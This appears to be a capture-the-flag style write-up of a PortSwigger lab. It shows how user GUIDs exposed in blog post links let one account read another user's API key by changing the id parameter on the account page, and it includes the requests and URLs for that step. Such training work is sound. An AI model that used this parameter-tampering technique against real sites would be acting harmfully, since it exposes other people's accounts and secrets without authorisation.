# User ID controlled by request parameter, with unpredictable user IDs 

https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-unpredictable-user-ids

This lab has a horizontal privilege escalation vulnerability on the user account page, but identifies users with GUIDs.
To solve the lab, find the GUID for `carlos`, then submit his API key as the solution.
You can log in to your own account using the following credentials: `wiener:peter`

## Solution

Logging in with the provided credentials. We see the following information:
```
Your username is: wiener
Your API Key is: J9lRnFJFA8TP3MslDSCZE5Gd6B9pGbXo
```
We must be able to somehow login as `carlos` and get the API key of `carlos`.

Observing the packets in Burp Suite, we see the account id, this should be the GUID, which we will not be able to guess and/or brute-force. We must find out the GUID of `carlos`.
```
GET /my-account?id=c97fe694-76bd-405a-bc98-216978a82bb9 HTTP/2
Host: 0ac000d004094358813dc0ef0043001c.web-security-academy.net
Cookie: session=brAEVnVq6Clcs6jCH9qDCD17DOakanX0
```

Checking some of the blog posts. Opening the first one, we see that it was posted by `administrator` and it is clickable. Observing Burp Suite, we see that the account id changed,
```
GET /blogs?userId=d7e2de4e-8f70-4e4f-a87e-e6a5babc7b88 HTTP/2
Host: 0ac000d004094358813dc0ef0043001c.web-security-academy.net
Cookie: session=brAEVnVq6Clcs6jCH9qDCD17DOakanX0
```
This must be the GUID of the user `administrator`. Technically, we would be able to get admin access with this information, but that is not the objective of the lab.
Checking the other blog posts, we see one by `carlos`.
```
GET /blogs?userId=a737c664-d241-48ed-ae9c-a8bc3f32c02a HTTP/2
Host: 0ac000d004094358813dc0ef0043001c.web-security-academy.net
Cookie: session=brAEVnVq6Clcs6jCH9qDCD17DOakanX0
```
We now have the GUID of `carlos`, lets go back to `My Account` and change the GUID at the address bar with the GUID of `carlos`
```
https://0ac000d004094358813dc0ef0043001c.web-security-academy.net/my-account?id=a737c664-d241-48ed-ae9c-a8bc3f32c02a
```

And we get the API key of `carlos` and we can submit this as our solution and the lab is solved!

```
My Account
Your username is: carlos

Your API Key is: lso9Q7pAzFOAUnom73POZg6NMwh7bDFw
```


